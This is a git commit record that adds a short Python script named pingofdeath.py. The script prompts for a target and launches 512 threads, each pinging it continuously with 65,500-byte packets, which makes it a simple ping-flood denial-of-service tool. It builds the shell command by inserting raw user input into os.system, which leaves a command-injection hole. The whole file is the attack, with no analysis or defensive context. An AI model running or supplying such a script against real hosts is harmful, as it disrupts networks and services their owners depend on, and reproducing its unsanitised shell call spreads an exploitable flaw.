24b4a06d088e00283153bd4c9ce136eb9fa5452e
Stoned Paul <45460445+StonedPaul@users.noreply.github.com>
2021-06-15 01:13:37 -0600

    Create pingofdeath.py

---
+++ pingofdeath.py
@@ -0,0 +1,9 @@
+import os
+import threading
+def ping(addy):
+    os.system(f"ping {addy} -t -l 65500")
+print("ping spammer??"+(5000*'[]'))
+addy = input("enter target:")
+for i in range(512):
+    thead = threading.Thread(target=ping,name=f'TH{i}')
+    thead.start()
